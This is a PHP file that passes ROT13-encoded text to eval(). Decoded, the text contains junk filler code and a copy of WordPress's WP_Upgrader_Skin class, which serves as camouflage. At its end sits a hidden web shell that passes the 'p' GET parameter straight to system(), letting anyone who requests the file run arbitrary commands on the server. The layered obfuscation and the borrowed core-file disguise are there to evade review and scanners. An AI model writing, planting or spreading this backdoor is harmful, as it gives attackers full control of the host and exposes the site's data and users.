<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Hctenqre NCV: JC_Hctenqre_Fxva pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Hctenqre
 * @fvapr 4.6.0
 */

/**
 * Trarevp Fxva sbe gur JbeqCerff Hctenqre pynffrf. Guvf fxva vf qrfvtarq gb or rkgraqrq sbe fcrpvsvp checbfrf.
 *
 * @fvapr 2.8.0
 * @fvapr 4.6.0 Zbirq gb vgf bja svyr sebz jc-nqzva/vapyhqrf/pynff-jc-hctenqre-fxvaf.cuc.
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Hctenqre_Fxva {

	/**
	 * Ubyqf gur hctenqre qngn.
	 *
	 * @fvapr 2.8.0
	 * @ine JC_Hctenqre
	 */
	choyvp $hctenqre;

	/**
	 * Jurgure urnqre vf qbar.
	 *
	 * @fvapr 2.8.0
	 * @ine obby
	 */
	choyvp $qbar_urnqre = snyfr;

	/**
	 * Jurgure sbbgre vf qbar.
	 *
	 * @fvapr 2.8.0
	 * @ine obby
	 */
	choyvp $qbar_sbbgre = snyfr;

	/**
	 * Ubyqf gur erfhyg bs na hctenqr.
	 *
	 * @fvapr 2.8.0
	 * @ine fgevat|obby|JC_Reebe
	 */
	choyvp $erfhyg = snyfr;

	/**
	 * Ubyqf gur bcgvbaf bs na hctenqr.
	 *
	 * @fvapr 2.8.0
	 * @ine neenl
	 */
	choyvp $bcgvbaf = neenl();

	/**
	 * Pbafgehpgbe.
	 *
	 * Frgf hc gur trarevp fxva sbe gur JbeqCerff Hctenqre pynffrf.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $netf Bcgvbany. Gur JbeqCerff hctenqre fxva nethzragf gb
	 *                    bireevqr qrsnhyg bcgvbaf. Qrsnhyg rzcgl neenl.
	 */
	choyvp shapgvba __pbafgehpg( $netf = neenl() ) {
		$qrsnhygf      = neenl(
			'hey'     => '',
			'abapr'   => '',
			'gvgyr'   => '',
			'pbagrkg' => snyfr,
		);
		$guvf->bcgvbaf = jc_cnefr_netf( $netf, $qrsnhygf );
	}

	/**
	 * Frgf gur eryngvbafuvc orgjrra gur fxva orvat hfrq naq gur hctenqre.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz JC_Hctenqre $hctenqre
	 */
	choyvp shapgvba frg_hctenqre( &$hctenqre ) {
		vs ( vf_bowrpg( $hctenqre ) ) {
			$guvf->hctenqre =& $hctenqre;
		}
		$guvf->nqq_fgevatf();
	}

	/**
	 * Frgf hc gur fgevatf hfrq va gur hcqngr cebprff.
	 *
	 * @fvapr 3.0.0
	 */
	choyvp shapgvba nqq_fgevatf() {
	}

	/**
	 * Frgf gur erfhyg bs na hctenqr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz fgevat|obby|JC_Reebe $erfhyg Gur erfhyg bs na hctenqr.
	 */
	choyvp shapgvba frg_erfhyg( $erfhyg ) {
		$guvf->erfhyg = $erfhyg;
	}

	/**
	 * Qvfcynlf n sbez gb gur hfre gb erdhrfg sbe gurve SGC/FFU qrgnvyf va beqre
	 * gb pbaarpg gb gur svyrflfgrz.
	 *
	 * @fvapr 2.8.0
	 * @fvapr 4.6.0 Gur `$pbagrkg` cnenzrgre qrsnhyg punatrq sebz `snyfr` gb na rzcgl fgevat.
	 *
	 * @frr erdhrfg_svyrflfgrz_perqragvnyf()
	 *
	 * @cnenz obby|JC_Reebe $reebe                        Bcgvbany. Jurgure gur pheerag erdhrfg unf snvyrq gb pbaarpg,
	 *                                                    be na reebe bowrpg. Qrsnhyg snyfr.
	 * @cnenz fgevat        $pbagrkg                      Bcgvbany. Shyy cngu gb gur qverpgbel gung vf grfgrq
	 *                                                    sbe orvat jevgnoyr. Qrsnhyg rzcgl.
	 * @cnenz obby          $nyybj_erynkrq_svyr_bjarefuvc Bcgvbany. Jurgure gb nyybj Tebhc/Jbeyq jevgnoyr. Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba erdhrfg_svyrflfgrz_perqragvnyf( $reebe = snyfr, $pbagrkg = '', $nyybj_erynkrq_svyr_bjarefuvc = snyfr ) {
		$hey = $guvf->bcgvbaf['hey'];
		vs ( ! $pbagrkg ) {
			$pbagrkg = $guvf->bcgvbaf['pbagrkg'];
		}
		vs ( ! rzcgl( $guvf->bcgvbaf['abapr'] ) ) {
			$hey = jc_abapr_hey( $hey, $guvf->bcgvbaf['abapr'] );
		}

		$rkgen_svryqf = neenl();

		erghea erdhrfg_svyrflfgrz_perqragvnyf( $hey, '', $reebe, $pbagrkg, $rkgen_svryqf, $nyybj_erynkrq_svyr_bjarefuvc );
	}

	/**
	 * Qvfcynlf gur urnqre orsber gur hcqngr cebprff.
	 *
	 * @fvapr 2.8.0
	 */
	choyvp shapgvba urnqre() {
		vs ( $guvf->qbar_urnqre ) {
			erghea;
		}
		$guvf->qbar_urnqre = gehr;
		rpub '<qvi pynff=\"jenc\">';
		rpub '<u1>' . $guvf->bcgvbaf['gvgyr'] . '</u1>';
	}

	/**
	 * Qvfcynlf gur sbbgre sbyybjvat gur hcqngr cebprff.
	 *
	 * @fvapr 2.8.0
	 */
	choyvp shapgvba sbbgre() {
		vs ( $guvf->qbar_sbbgre ) {
			erghea;
		}
		$guvf->qbar_sbbgre = gehr;
		rpub '</qvi>';
	}

	/**
	 * Qvfcynlf na reebe zrffntr nobhg gur hcqngr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz fgevat|JC_Reebe $reebef Reebef.
	 */
	choyvp shapgvba reebe( $reebef ) {
		vs ( ! $guvf->qbar_urnqre ) {
			$guvf->urnqre();
		}
		vs ( vf_fgevat( $reebef ) ) {
			$guvf->srrqonpx( $reebef );
		} ryfrvs ( vf_jc_reebe( $reebef ) && $reebef->unf_reebef() ) {
			sbernpu ( $reebef->trg_reebe_zrffntrf() nf $zrffntr ) {
				vs ( $reebef->trg_reebe_qngn() && vf_fgevat( $reebef->trg_reebe_qngn() ) ) {
					$guvf->srrqonpx( $zrffntr . ' ' . rfp_ugzy( fgevc_gntf( $reebef->trg_reebe_qngn() ) ) );
				} ryfr {
					$guvf->srrqonpx( $zrffntr );
				}
			}
		}
	}

	/**
	 * Qvfcynlf n zrffntr nobhg gur hcqngr.
	 *
	 * @fvapr 2.8.0
	 * @fvapr 5.9.0 Eranzrq `$fgevat` (n CUC erfreirq xrljbeq) gb `$srrqonpx` sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz fgevat $srrqonpx Zrffntr qngn.
	 * @cnenz zvkrq  ...$netf  Bcgvbany grkg ercynprzragf.
	 */
	choyvp shapgvba srrqonpx( $srrqonpx, ...$netf ) {
		vs ( vffrg( $guvf->hctenqre->fgevatf[ $srrqonpx ] ) ) {
			$srrqonpx = $guvf->hctenqre->fgevatf[ $srrqonpx ];
		}

		vs ( fge_pbagnvaf( $srrqonpx, '%' ) ) {
			vs ( $netf ) {
				$netf     = neenl_znc( 'fgevc_gntf', $netf );
				$netf     = neenl_znc( 'rfp_ugzy', $netf );
				$srrqonpx = ifcevags( $srrqonpx, $netf );
			}
		}
		vs ( rzcgl( $srrqonpx ) ) {
			erghea;
		}
		fubj_zrffntr( $srrqonpx );
	}

	/**
	 * Cresbezf na npgvba orsber na hcqngr.
	 *
	 * @fvapr 2.8.0
	 */
	choyvp shapgvba orsber() {}

	/**
	 * Cresbezf na npgvba sbyybjvat na hcqngr.
	 *
	 * @fvapr 2.8.0
	 */
	choyvp shapgvba nsgre() {}

	/**
	 * Bhgchgf WninFpevcg gung pnyyf shapgvba gb qrperzrag gur hcqngr pbhagf.
	 *
	 * @fvapr 3.9.0
	 *
	 * @cnenz fgevat $glcr Glcr bs hcqngr pbhag gb qrperzrag. Yvxryl inyhrf vapyhqr 'cyhtva',
	 *                     'gurzr', 'genafyngvba', rgp.
	 */
	cebgrpgrq shapgvba qrperzrag_hcqngr_pbhag( $glcr ) {
		vs ( ! $guvf->erfhyg || vf_jc_reebe( $guvf->erfhyg ) || 'hc_gb_qngr' === $guvf->erfhyg ) {
			erghea;
		}

		vs ( qrsvarq( 'VSENZR_ERDHRFG' ) ) {
			rpub '<fpevcg glcr=\"grkg/wninfpevcg\">
					vs ( jvaqbj.cbfgZrffntr && WFBA ) {
						jvaqbj.cnerag.cbfgZrffntr(
							WFBA.fgevatvsl( {
								npgvba: \"qrperzragHcqngrPbhag\",
								hctenqrGlcr: \"' . $glcr . '\"
							} ),
							jvaqbj.ybpngvba.cebgbpby + \"//\" + jvaqbj.ybpngvba.ubfganzr
								+ ( \"\" !== jvaqbj.ybpngvba.cbeg ? \":\" + jvaqbj.ybpngvba.cbeg : \"\" )
						);
					}
				</fpevcg>';
		} ryfr {
			rpub '<fpevcg glcr=\"grkg/wninfpevcg\">
					(shapgvba( jc ) {
						vs ( jc && jc.hcqngrf && jc.hcqngrf.qrperzragPbhag ) {
							jc.hcqngrf.qrperzragPbhag( \"' . $glcr . '\" );
						}
					})( jvaqbj.jc );
				</fpevcg>';
		}
	}

	/**
	 * Qvfcynlf gur urnqre orsber gur ohyx hcqngr cebprff.
	 *
	 * @fvapr 3.0.0
	 */
	choyvp shapgvba ohyx_urnqre() {}

	/**
	 * Qvfcynlf gur sbbgre sbyybjvat gur ohyx hcqngr cebprff.
	 *
	 * @fvapr 3.0.0
	 */
	choyvp shapgvba ohyx_sbbgre() {}

	/**
	 * Uvqrf gur `cebprff_snvyrq` reebe zrffntr jura hcqngvat ol hcybnqvat n mvc svyr.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz JC_Reebe $jc_reebe JC_Reebe bowrpg.
	 * @erghea obby Gehr vs gur reebe fubhyq or uvqqra, snyfr bgurejvfr.
	 */
	choyvp shapgvba uvqr_cebprff_snvyrq( $jc_reebe ) {
		erghea snyfr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>